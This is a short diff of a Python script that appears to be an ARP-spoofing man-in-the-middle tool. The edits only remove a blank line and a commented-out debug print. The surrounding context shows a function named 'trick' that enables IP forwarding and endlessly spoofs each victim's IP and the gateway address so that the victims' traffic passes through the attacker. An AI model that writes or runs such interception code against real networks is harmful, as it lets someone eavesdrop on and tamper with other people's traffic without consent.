@@ -11,7 +11,6 @@ import shutil
 GATEWAY_IP = '10.6.0.254'
 LOG_DIR = 'log'
 IPS = list()
-
 lock = threading.Lock()
 
 
@@ -38,7 +37,6 @@ def trick(victim_ips: str):
     os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
     while True:
         for victim_ip in victim_ips:
-            # print('attack', victim_ip)
             spoof(victim_ip, GATEWAY_IP)
             spoof(GATEWAY_IP, victim_ip)
         time.sleep(10)
